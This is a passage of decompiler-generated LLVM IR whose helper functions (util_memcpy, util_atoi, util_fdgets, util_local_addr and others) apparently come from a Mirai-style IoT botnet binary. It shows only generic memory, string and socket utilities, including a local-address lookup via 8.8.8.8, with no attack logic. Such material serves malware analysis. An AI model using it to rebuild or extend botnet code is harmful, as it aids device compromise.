  %v2_11944 = load i8, i8* %arg1, align 1
  %v3_11944 = zext i8 %v2_11944 to i32
  store i32 %v3_11944, i32* @r2, align 4
  %v2_11948 = icmp eq i8 %v2_11944, 0
  br i1 %v2_11948, label %bb, label %dec_label_pc_11954

bb:                                               ; preds = %entry
  store i32 %v3_11944, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11968

dec_label_pc_11954:                               ; preds = %entry
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11958

dec_label_pc_11958:                               ; preds = %dec_label_pc_11958, %dec_label_pc_11954
  %v0_11958 = phi i32 [ %v1_11958, %dec_label_pc_11958 ], [ 0, %dec_label_pc_11954 ]
  %v1_11958 = add i32 %v0_11958, 1
  store i32 %v1_11958, i32* %ip.global-to-local, align 4
  %v2_1195c = add i32 %v1_11958, %tmp
  %v3_1195c = inttoptr i32 %v2_1195c to i8*
  %v4_1195c = load i8, i8* %v3_1195c, align 1
  %v2_11960 = icmp eq i8 %v4_1195c, 0
  br i1 %v2_11960, label %dec_label_pc_11968, label %dec_label_pc_11958

dec_label_pc_11968:                               ; preds = %dec_label_pc_11958, %bb
  %v0_11968 = phi i32 [ %v3_11944, %bb ], [ %v1_11958, %dec_label_pc_11958 ]
  br label %dec_label_pc_11974

dec_label_pc_11970:                               ; preds = %dec_label_pc_11974
  %v0_11970 = load i32, i32* @r1, align 4
  %v1_11970 = add i32 %v0_11970, 1
  %v2_11970 = inttoptr i32 %v1_11970 to i8*
  %v3_11970 = load i8, i8* %v2_11970, align 1
  %v4_11970 = zext i8 %v3_11970 to i32
  store i32 %v4_11970, i32* @r2, align 4
  store i32 %v1_11970, i32* @r1, align 4
  %v0_11974.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_11974

dec_label_pc_11974:                               ; preds = %dec_label_pc_11968, %dec_label_pc_11970
  %v0_1197c.off0 = phi i8 [ %v2_11944, %dec_label_pc_11968 ], [ %v3_11970, %dec_label_pc_11970 ]
  %v0_11974 = phi i32 [ %v0_11968, %dec_label_pc_11968 ], [ %v0_11974.pr, %dec_label_pc_11970 ]
  %v1_11974 = add i32 %v0_11974, -1
  store i32 %v1_11974, i32* @r3, align 4
  %v3_11978 = icmp eq i32 %v0_11974, 0
  %v2_1197c = load i32, i32* @r0, align 4
  %v3_1197c = inttoptr i32 %v2_1197c to i8*
  store i8 %v0_1197c.off0, i8* %v3_1197c, align 1
  %v4_1197c = load i32, i32* @r0, align 4
  %v5_1197c = add i32 %v4_1197c, 1
  store i32 %v5_1197c, i32* @r0, align 4
  br i1 %v3_11978, label %dec_label_pc_11984, label %dec_label_pc_11970

dec_label_pc_11984:                               ; preds = %dec_label_pc_11974
  %v0_11984 = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_11984

; uselistorder directives
  uselistorder i32 %v0_11974, { 1, 0 }
  uselistorder i32 %v1_11958, { 0, 1, 3, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_11974, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_1198c = icmp eq i32 %arg3, 0
  %v0_11990 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1198c, i32 %v0_11990)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11998

dec_label_pc_11998:                               ; preds = %dec_label_pc_11998, %entry
  %v0_11998 = phi i32 [ %v1_119a0, %dec_label_pc_11998 ], [ 0, %entry ]
  %v2_11998 = add i32 %v0_11998, %arg2
  %v3_11998 = inttoptr i32 %v2_11998 to i8*
  %v4_11998 = load i8, i8* %v3_11998, align 1
  %v4_1199c = add i32 %v0_11998, %arg1
  %v5_1199c = inttoptr i32 %v4_1199c to i8*
  store i8 %v4_11998, i8* %v5_1199c, align 1
  %v0_119a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_119a0 = add i32 %v0_119a0, 1
  store i32 %v1_119a0, i32* %ip.global-to-local, align 4
  %v9_119a4 = icmp eq i32 %v1_119a0, %arg3
  br i1 %v9_119a4, label %dec_label_pc_119ac, label %dec_label_pc_11998

dec_label_pc_119ac:                               ; preds = %dec_label_pc_11998
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_119a0, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v0_119b0 = load i32, i32* @r1, align 4
  %v2_119b0 = icmp eq i32 %v0_119b0, 0
  %v0_119b4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_119b0, i32 %v0_119b4)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_119bc

dec_label_pc_119bc:                               ; preds = %dec_label_pc_119bc, %entry
  %v2_119c0 = phi i32 [ %v1_119c4, %dec_label_pc_119bc ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v3_119c0 = load i32, i32* @r0, align 4
  %v4_119c0 = add i32 %v3_119c0, %v2_119c0
  %v5_119c0 = inttoptr i32 %v4_119c0 to i8*
  store i8 0, i8* %v5_119c0, align 1
  %v0_119c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_119c4 = add i32 %v0_119c4, 1
  store i32 %v1_119c4, i32* %r2.global-to-local, align 4
  %v1_119c8 = load i32, i32* @r1, align 4
  %v9_119c8 = icmp eq i32 %v1_119c4, %v1_119c8
  br i1 %v9_119c8, label %dec_label_pc_119d0, label %dec_label_pc_119bc

dec_label_pc_119d0:                               ; preds = %dec_label_pc_119bc
  %v1_119d0 = load i32, i32* @r0, align 4
  ret i32 %v1_119d0

; uselistorder directives
  uselistorder i32 %v1_119c4, { 1, 2, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_119e8 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_119e8, label %dec_label_pc_119f0, label %dec_label_pc_119f8

dec_label_pc_119f0:                               ; preds = %dec_label_pc_11a0c, %dec_label_pc_119f8, %entry, %dec_label_pc_11a38
  %storemerge = phi i32 [ %v1_11a38, %dec_label_pc_11a38 ], [ -1, %entry ], [ -1, %dec_label_pc_119f8 ], [ -1, %dec_label_pc_11a0c ]
  ret i32 %storemerge

dec_label_pc_119f8:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_119f0, label %dec_label_pc_11a00

dec_label_pc_11a00:                               ; preds = %dec_label_pc_119f8
  br label %dec_label_pc_11a18

dec_label_pc_11a0c:                               ; preds = %bb, %dec_label_pc_11a2c
  %v1_11a183 = phi i32 [ %v1_11a2c, %dec_label_pc_11a2c ], [ 0, %bb ]
  %v1_11a0c = add i32 %v0_11a38, 1
  %v9_11a10 = icmp eq i32 %v1_11a0c, %arg2
  br i1 %v9_11a10, label %dec_label_pc_119f0, label %dec_label_pc_11a18

dec_label_pc_11a18:                               ; preds = %dec_label_pc_11a0c, %dec_label_pc_11a00
  %v0_11a38 = phi i32 [ %v1_11a0c, %dec_label_pc_11a0c ], [ 0, %dec_label_pc_11a00 ]
  %v1_11a18 = phi i32 [ %v1_11a183, %dec_label_pc_11a0c ], [ 0, %dec_label_pc_11a00 ]
  %v2_11a18 = add i32 %v1_11a18, %arg3
  %v3_11a18 = inttoptr i32 %v2_11a18 to i8*
  %v4_11a18 = load i8, i8* %v3_11a18, align 1
  %v2_11a1c = add i32 %v0_11a38, %arg1
  %v3_11a1c = inttoptr i32 %v2_11a1c to i8*
  %v4_11a1c = load i8, i8* %v3_11a1c, align 1
  %v9_11a20 = icmp eq i8 %v4_11a1c, %v4_11a18
  br i1 %v9_11a20, label %dec_label_pc_11a2c, label %bb

bb:                                               ; preds = %dec_label_pc_11a18
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_11a0c

dec_label_pc_11a2c:                               ; preds = %dec_label_pc_11a18
  %v1_11a2c = add i32 %v1_11a18, 1
  store i32 %v1_11a2c, i32* @ip, align 4
  %v9_11a30 = icmp eq i32 %v1_11a2c, %arg4
  br i1 %v9_11a30, label %dec_label_pc_11a38, label %dec_label_pc_11a0c

dec_label_pc_11a38:                               ; preds = %dec_label_pc_11a2c
  %v1_11a38 = add i32 %v0_11a38, 1
  br label %dec_label_pc_119f0

; uselistorder directives
  uselistorder i32 %v1_11a2c, { 1, 2, 0 }
  uselistorder i32 %v1_11a18, { 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11a0c, { 1, 0 }
  uselistorder label %dec_label_pc_119f0, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_11a50

dec_label_pc_11a50:                               ; preds = %.thread, %dec_label_pc_11a64, %bb, %entry
  %v0_11a50 = phi i32 [ %tmp, %entry ], [ %v5_11a50, %bb ], [ %v5_11a50, %dec_label_pc_11a64 ], [ %v5_11a50, %.thread ]
  %v1_11a50 = inttoptr i32 %v0_11a50 to i8*
  %v2_11a50 = load i8, i8* %v1_11a50, align 1
  %v5_11a50 = add i32 %v0_11a50, 1
  %v7_11a54 = icmp eq i8 %v2_11a50, 9
  br i1 %v7_11a54, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_11a50
  br label %dec_label_pc_11a50

bb:                                               ; preds = %dec_label_pc_11a50
  %v8_11a58 = icmp eq i8 %v2_11a50, 32
  br i1 %v8_11a58, label %dec_label_pc_11a50, label %dec_label_pc_11a64

dec_label_pc_11a64:                               ; preds = %bb
  %v7_11a64 = icmp eq i8 %v2_11a50, 10
  br i1 %v7_11a64, label %dec_label_pc_11a50, label %dec_label_pc_11a6c

dec_label_pc_11a6c:                               ; preds = %dec_label_pc_11a64
  %v7_11a6c = icmp eq i8 %v2_11a50, 45
  br i1 %v7_11a6c, label %dec_label_pc_11b5c, label %dec_label_pc_11a74

dec_label_pc_11a74:                               ; preds = %dec_label_pc_11a6c
  %v7_11a74 = icmp eq i8 %v2_11a50, 43
  br i1 %v7_11a74, label %bb54, label %dec_label_pc_11a84

bb54:                                             ; preds = %dec_label_pc_11a74
  %v2_11a78 = inttoptr i32 %v5_11a50 to i8*
  %v3_11a78 = load i8, i8* %v2_11a78, align 1
  %v6_11a78 = add i32 %v0_11a50, 2
  br label %dec_label_pc_11a84

dec_label_pc_11a84:                               ; preds = %bb54, %dec_label_pc_11a74, %dec_label_pc_11b5c
  %v1_11b2c39 = phi i32 [ %v5_11b5c, %dec_label_pc_11b5c ], [ %v5_11a50, %dec_label_pc_11a74 ], [ %v6_11a78, %bb54 ]
  %v0_11aac10.in = phi i8 [ %v2_11b5c, %dec_label_pc_11b5c ], [ %v2_11a50, %dec_label_pc_11a74 ], [ %v3_11a78, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_11b5c ], [ 2147483647, %dec_label_pc_11a74 ], [ 2147483647, %bb54 ]
  %v0_11b6c = phi i32 [ 1, %dec_label_pc_11b5c ], [ 0, %dec_label_pc_11a74 ], [ 0, %bb54 ]
  %v2_11a8c = udiv i32 %storemerge1, %arg2
  %v3_11a8c = urem i32 %storemerge1, %arg2
  br label %dec_label_pc_11aac.outer

dec_label_pc_11aac.outer:                         ; preds = %.thread5, %dec_label_pc_11a84
  %v1_11b2c.ph = phi i32 [ %v6_11b2c, %.thread5 ], [ %v1_11b2c39, %dec_label_pc_11a84 ]
  %v2_11b28.ph = phi i32 [ %v5_11b28, %.thread5 ], [ 0, %dec_label_pc_11a84 ]
  %v1_11aec.ph.in = phi i8 [ %v3_11b2c, %.thread5 ], [ %v0_11aac10.in, %dec_label_pc_11a84 ]
  %v1_11b04.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_11a84 ]
  %v3_11af8 = icmp uge i32 %v2_11b28.ph, %v2_11a8c
  %v9_11af8 = icmp eq i32 %v2_11b28.ph, %v2_11a8c
  %v2_11afc = xor i1 %v3_11af8, true
  %v3_11afc = or i1 %v9_11af8, %v2_11afc
  %v2_11b00 = xor i1 %v9_11af8, true
  %v3_11b00 = and i1 %v3_11af8, %v2_11b00
  %v2_11b20 = icmp eq i1 %v9_11af8, false
  br label %dec_label_pc_11aac

dec_label_pc_11aac:                               ; preds = %dec_label_pc_11aac.outer, %dec_label_pc_11b34
  %v1_11b2c = phi i32 [ %v5_11b34, %dec_label_pc_11b34 ], [ %v1_11b2c.ph, %dec_label_pc_11aac.outer ]
  %v1_11b04 = phi i32 [ -1, %dec_label_pc_11b34 ], [ %v1_11b04.ph, %dec_label_pc_11aac.outer ]
  %v1_11aec.in = phi i8 [ %v2_11b34, %dec_label_pc_11b34 ], [ %v1_11aec.ph.in, %dec_label_pc_11aac.outer ]
  %v1_11aec = zext i8 %v1_11aec.in to i32
  %v1_11aac = urem i32 %v1_11aec, 256
  %v1_11ab0 = add nsw i32 %v1_11aac, -48
  %v1_11ab8 = add nsw i32 %v1_11aac, -97
  %v1_11abc = add nsw i32 %v1_11aec, -48
  %v1_11ac0 = add nsw i32 %v1_11aac, -65
  %tmp87 = icmp ult i32 %v1_11ab0, 10
  br i1 %tmp87, label %dec_label_pc_11af0, label %dec_label_pc_11ac8

dec_label_pc_11ac8:                               ; preds = %dec_label_pc_11aac
  %v2_11ac8 = icmp ugt i32 %v1_11ac0, 24
  %v7_11ac8 = icmp eq i32 %v1_11ac0, 25
  %v2_11acc = xor i1 %v7_11ac8, true
  %v3_11acc = and i1 %v2_11ac8, %v2_11acc
  br i1 %v3_11acc, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_11ac8
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_11ac8, %bb55
  %v0_11ae015 = phi i32 [ %v1_11abc, %dec_label_pc_11ac8 ], [ 0, %bb55 ]
  %v2_11ad0 = xor i1 %v2_11ac8, true
  %v3_11ad0 = or i1 %v7_11ac8, %v2_11ad0
  br i1 %v3_11ad0, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_11ae0 = phi i32 [ %v0_11ae015, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_11acc, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_11ad8 = icmp ugt i32 %v1_11ab8, 24
  %v11_11ad8 = icmp eq i32 %v1_11ab8, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_11adc = phi i1 [ %v7_11ac8, %bb58 ], [ %v11_11ad8, %bb59 ]
  %v0_11adc = phi i1 [ %v2_11ac8, %bb58 ], [ %v6_11ad8, %bb59 ]
  %v2_11adc = xor i1 %v1_11adc, true
  %v3_11adc = and i1 %v0_11adc, %v2_11adc
  br i1 %v3_11adc, label %dec_label_pc_11b40, label %dec_label_pc_11ae0

dec_label_pc_11ae0:                               ; preds = %bb60
  %v2_11ae0 = icmp eq i32 %v0_11ae0, 0
  %. = select i1 %v2_11ae0, i32 87, i32 55
  %v2_11aec = sub nsw i32 %v1_11aec, %.
  br label %dec_label_pc_11af0

dec_label_pc_11af0:                               ; preds = %dec_label_pc_11aac, %dec_label_pc_11ae0
  %v0_11b0433 = phi i32 [ %v1_11ac0, %dec_label_pc_11aac ], [ %., %dec_label_pc_11ae0 ]
  %v3_11b28 = phi i32 [ %v1_11abc, %dec_label_pc_11aac ], [ %v2_11aec, %dec_label_pc_11ae0 ]
  %v2_11af0 = sub i32 %v3_11b28, %arg2
  %v4_11af0 = xor i32 %v3_11b28, %arg2
  %v5_11af0 = xor i32 %v2_11af0, %v3_11b28
  %v6_11af0 = and i32 %v5_11af0, %v4_11af0
  %v7_11af0 = icmp slt i32 %v6_11af0, 0
  %v8_11af0 = icmp slt i32 %v2_11af0, 0
  %v2_11af4 = xor i1 %v8_11af0, %v7_11af0
  br i1 %v2_11af4, label %dec_label_pc_11af8, label %dec_label_pc_11b40

dec_label_pc_11af8:                               ; preds = %dec_label_pc_11af0
  br i1 %v3_11afc, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_11af8
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_11af8, %bb63
  %v0_11b0432 = phi i32 [ %v0_11b0433, %dec_label_pc_11af8 ], [ 0, %bb63 ]
  br i1 %v3_11b00, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_11b04 = phi i32 [ %v0_11b0432, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_11b04, 0
  %v4_11b04 = zext i1 %tmp88 to i32
  %v5_11b04 = or i32 %v0_11b04, %v4_11b04
  %v7_11b04 = icmp eq i32 %v5_11b04, 0
  br i1 %v7_11b04, label %dec_label_pc_11b0c, label %dec_label_pc_11b34

dec_label_pc_11b0c:                               ; preds = %bb66
  %v2_11b18 = sub i32 %v3_11b28, %v3_11a8c
  %v4_11b18 = xor i32 %v3_11b28, %v3_11a8c
  %v5_11b18 = xor i32 %v2_11b18, %v3_11b28
  %v6_11b18 = and i32 %v5_11b18, %v4_11b18
  %v7_11b18 = icmp slt i32 %v6_11b18, 0
  %v8_11b18 = icmp slt i32 %v2_11b18, 0
  %v9_11b18 = icmp eq i32 %v3_11b28, %v3_11a8c
  %v3_11b1c = xor i1 %v8_11b18, %v7_11b18
  %v4_11b1c = or i1 %v9_11b18, %v3_11b1c
  br i1 %v4_11b1c, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_11b0c
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_11b0c
  br i1 %v2_11b20, label %.thread5, label %dec_label_pc_11b34

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_11b28 = mul i32 %v2_11b28.ph, %arg2
  %v5_11b28 = add i32 %v3_11b28, %v4_11b28
  %v2_11b2c = inttoptr i32 %v1_11b2c to i8*
  %v3_11b2c = load i8, i8* %v2_11b2c, align 1
  %v6_11b2c = add i32 %v1_11b2c, 1
  br label %dec_label_pc_11aac.outer

dec_label_pc_11b34:                               ; preds = %thread-pre-split, %bb66
  %v1_11b34 = inttoptr i32 %v1_11b2c to i8*
  %v2_11b34 = load i8, i8* %v1_11b34, align 1
  %v5_11b34 = add i32 %v1_11b2c, 1
  br label %dec_label_pc_11aac

dec_label_pc_11b40:                               ; preds = %dec_label_pc_11af0, %bb60
  %v1_11b40 = icmp slt i32 %v1_11b04, 0
  %v2_11b6c = icmp eq i32 %v0_11b6c, 0
  br i1 %v1_11b40, label %dec_label_pc_11b6c, label %dec_label_pc_11b48

dec_label_pc_11b48:                               ; preds = %dec_label_pc_11b40
  br i1 %v2_11b6c, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_11b48
  %v2_11b4c = sub i32 0, %v2_11b28.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_11b48, %bb69
  %v1_11b58 = phi i32 [ -2147483648, %bb71 ], [ %v2_11b28.ph, %dec_label_pc_11b48 ], [ %v2_11b4c, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_11b58

dec_label_pc_11b5c:                               ; preds = %dec_label_pc_11a6c
  %v1_11b5c = inttoptr i32 %v5_11a50 to i8*
  %v2_11b5c = load i8, i8* %v1_11b5c, align 1
  %v5_11b5c = add i32 %v0_11a50, 2
  br label %dec_label_pc_11a84

dec_label_pc_11b6c:                               ; preds = %dec_label_pc_11b40
  br i1 %v2_11b6c, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_11b6c
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_11b6c
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_11b6c, { 1, 0 }
  uselistorder i32 %v2_11b18, { 1, 0 }
  uselistorder i32 %v2_11af0, { 1, 0 }
  uselistorder i32 %v3_11b28, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_11ac8, { 1, 2, 0 }
  uselistorder i1 %v2_11ac8, { 1, 0, 2 }
  uselistorder i32 %v1_11aac, { 1, 2, 0 }
  uselistorder i32 %v1_11aec, { 1, 0, 2 }
  uselistorder i32 %v1_11b04, { 1, 0 }
  uselistorder i32 %v1_11b2c, { 2, 3, 1, 0 }
  uselistorder i1 %v9_11af8, { 1, 0, 2 }
  uselistorder i1 %v3_11af8, { 1, 0 }
  uselistorder i32 %v2_11b28.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_11a8c, { 1, 0, 2 }
  uselistorder i32 %v2_11a8c, { 1, 0 }
  uselistorder i32 %v5_11a50, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_11a50, { 0, 1, 3, 2 }
  uselistorder i32 87, { 0, 2, 1 }
  uselistorder i32 25, { 21, 22, 5, 12, 2, 11, 3, 13, 4, 14, 10, 15, 6, 16, 0, 17, 7, 8, 18, 9, 19, 1, 20 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 0, 1, 13, 2, 3, 4, 5, 6, 7 }
  uselistorder i8 9, { 2, 0, 1 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_11af0, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_11aac, { 1, 0 }
  uselistorder label %dec_label_pc_11a84, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11a50, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_11b7c = load i32, i32* @r4, align 4
  store i32 %v3_11b7c, i32* %stack_var_-24, align 4
  %v6_11b7c = load i32, i32* @r5, align 4
  %v9_11b7c = load i32, i32* @r6, align 4
  %v12_11b7c = load i32, i32* @r7, align 4
  %v15_11b7c = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_11b94

dec_label_pc_11b94:                               ; preds = %dec_label_pc_11bb8.dec_label_pc_11b94_crit_edge, %entry
  %v0_11b98 = phi i32 [ %v0_11b98.pre, %dec_label_pc_11bb8.dec_label_pc_11b94_crit_edge ], [ %arg3, %entry ]
  %v0_11b94 = phi i32 [ %v5_11bb8, %dec_label_pc_11bb8.dec_label_pc_11b94_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_11b94, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_11ba0 = call i32 @__libc_read(i32 %v0_11b98)
  %v7_11ba4 = icmp eq i32 %v1_11ba0, 1
  %v0_11bac = load i32, i32* @r5, align 4
  br i1 %v7_11ba4, label %dec_label_pc_11bac, label %dec_label_pc_11bc4

dec_label_pc_11bac:                               ; preds = %dec_label_pc_11b94
  %v1_11bac = add i32 %v0_11bac, 1
  store i32 %v1_11bac, i32* @r5, align 4
  %v1_11bb0 = load i32, i32* @r8, align 4
  %v6_11bb4 = icmp slt i32 %v1_11bac, %v1_11bb0
  br i1 %v6_11bb4, label %dec_label_pc_11bb8, label %.loopexit

dec_label_pc_11bb8:                               ; preds = %dec_label_pc_11bac
  %v0_11bb8 = load i32, i32* @r4, align 4
  %v1_11bb8 = inttoptr i32 %v0_11bb8 to i8*
  %v2_11bb8 = load i8, i8* %v1_11bb8, align 1
  %v3_11bb8 = zext i8 %v2_11bb8 to i32
  store i32 %v3_11bb8, i32* @r3, align 4
  %v5_11bb8 = add i32 %v0_11bb8, 1
  store i32 %v5_11bb8, i32* @r4, align 4
  %v7_11bbc = icmp eq i8 %v2_11bb8, 10
  br i1 %v7_11bbc, label %dec_label_pc_11bc4, label %dec_label_pc_11bb8.dec_label_pc_11b94_crit_edge

dec_label_pc_11bb8.dec_label_pc_11b94_crit_edge:  ; preds = %dec_label_pc_11bb8
  %v0_11b98.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11b94

dec_label_pc_11bc4:                               ; preds = %dec_label_pc_11b94, %dec_label_pc_11bb8
  %v0_11bc4 = phi i32 [ %v1_11bac, %dec_label_pc_11bb8 ], [ %v0_11bac, %dec_label_pc_11b94 ]
  %v2_11bc4 = icmp eq i32 %v0_11bc4, 0
  br i1 %v2_11bc4, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_11bc4
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_11bac, %dec_label_pc_11bc4, %bb
  %v0_11bcc = load i32, i32* @r7, align 4
  %v2_11bd0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11bd0, i32* @r4, align 4
  store i32 %v6_11b7c, i32* @r5, align 4
  store i32 %v9_11b7c, i32* @r6, align 4
  store i32 %v12_11b7c, i32* @r7, align 4
  store i32 %v15_11b7c, i32* @r8, align 4
  ret i32 %v0_11bcc

; uselistorder directives
  uselistorder i32 %v5_11bb8, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11bc4, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11bd8 = load i32, i32* @r4, align 4
  %v6_11bd8 = load i32, i32* @r5, align 4
  %v9_11bd8 = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_11be8 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_11bf0 = inttoptr i32 %v0_11be8 to i32*
  store i32 0, i32* %v2_11bf0, align 4
  %v0_11bfc = load i32, i32* %r4.global-to-local, align 4
  %v3_11c00 = call i32 @socket(i32 2, i32 2, i32 %v0_11bfc)
  %v7_11c04 = icmp eq i32 %v3_11c00, -1
  store i32 %v3_11c00, i32* @r5, align 4
  br i1 %v7_11c04, label %bb, label %dec_label_pc_11c14

bb:                                               ; preds = %entry
  %v1_11c0c = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11c60

dec_label_pc_11c14:                               ; preds = %entry
  %v2_11c20 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11c20, i32* @r4, align 4
  %v0_11c2c = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_11c40 = call i32 @__libc_connect(i32 %v3_11c00, i32 %v2_11c20, i32 %v0_11c2c)
  store i32 %v2_11c20, i32* @r1, align 4
  %v2_11c48 = ptrtoint i32* %stack_var_-20 to i32
  %v0_11c4c = load i32, i32* @r5, align 4
  %v3_11c50 = call i32 @__GI_getsockname(i32 %v0_11c4c, i32 %v2_11c20, i32 %v2_11c48)
  %v0_11c54 = load i32, i32* @r5, align 4
  %v1_11c58 = call i32 @__GI___libc_close(i32 %v0_11c54)
  br label %dec_label_pc_11c60

dec_label_pc_11c60:                               ; preds = %bb, %dec_label_pc_11c14
  %storemerge = phi i32 [ 134744072, %dec_label_pc_11c14 ], [ %v1_11c0c, %bb ]
  store i32 %v3_11bd8, i32* @r4, align 4
  store i32 %v6_11bd8, i32* @r5, align 4
  store i32 %v9_11bd8, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_11c20, { 1, 0, 2, 3 }
  uselistorder i32 %v3_11c00, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 6, 7, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 24, 25, 22, 23, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 5, 1, 4, 3, 2 }
  uselistorder i32 ()* @__GI___errno_location, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_11c60, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_11c70 = load i8, i8* %tmp, align 1
  %v4_11c70 = zext i8 %v3_11c70 to i32
  store i32 %v4_11c70, i32* @r3, align 4
  %v2_11c74 = icmp eq i8 %v3_11c70, 0
  br i1 %v2_11c74, label %bb, label %dec_label_pc_11c88

bb:                                               ; preds = %entry
  br label %dec_label_pc_11c9c

dec_label_pc_11c88:                               ; preds = %entry
  br label %dec_label_pc_11c8c

dec_label_pc_11c8c:                               ; preds = %dec_label_pc_11c8c, %dec_label_pc_11c88
  %v0_11c8c = phi i32 [ %v1_11c8c, %dec_label_pc_11c8c ], [ 0, %dec_label_pc_11c88 ]
  %v1_11c8c = add i32 %v0_11c8c, 1
  %v2_11c90 = add i32 %v1_11c8c, %arg2
  %v3_11c90 = inttoptr i32 %v2_11c90 to i8*
  %v4_11c90 = load i8, i8* %v3_11c90, align 1
  %v6_11c90 = zext i8 %v4_11c90 to i32
  store i32 %v6_11c90, i32* @r3, align 4
  %v2_11c94 = icmp eq i8 %v4_11c90, 0
